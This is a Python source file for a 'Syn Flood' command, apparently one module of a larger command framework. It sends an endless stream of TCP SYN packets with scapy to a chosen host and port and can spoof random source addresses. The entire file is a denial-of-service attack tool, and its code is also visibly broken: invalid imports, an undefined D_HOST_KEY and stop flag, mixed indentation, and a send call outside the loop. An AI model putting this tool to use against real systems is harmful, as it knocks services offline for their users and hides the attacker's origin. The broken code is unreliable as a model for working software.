import random
import sys
import threading
from scapy import scapy.all
import Thread
from command import Command, D_PORT_KEY, D_PORT_KEY, RAND_SRC_KEY

class SynFlood(Command):
    
    display_name = "Syn Flood"
    
    class SynFloodThread(Thread):

	def __init__(self, d_host, d_port, rand_src):
        Thread.__init__(self)
        self.d_host = d_host
        self.d_port = d_port
        self.rand_src = rand_src         

	def run(self):

		while not self.stopped:
			ip_segment = IP()
			ip_segment.dst = self.d_host

			if self.rand_src:
				# randomize class A IP
				ip_segment.src = "%i.%i.%i.%i" % (random.randint(1,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			# else - scapy will automatically assign the local IP as src.

			tcp_segment = TCP(flags="S")
			tcp_segment.sport = RandShort()
			tcp_segment.dport = int(self.d_port)

        	send(ip_segment/tcp_segment,  verbose=0) # Sends the Packet

    def execute(self, params):
    
        self.d_host = params[D_HOST_KEY]
        self.d_port = params[D_PORT_KEY]
        self.rand_src = params.get(RAND_SRC_KEY) or False
    
    	syn_flood_thread = SynFloodThread(self.d_host, self.d_port, self.rand_src)
    	syn_flood_thread.start()
    	# add this thread to the thread pool with 'syn_flood_key'
    	return syn_flood_thread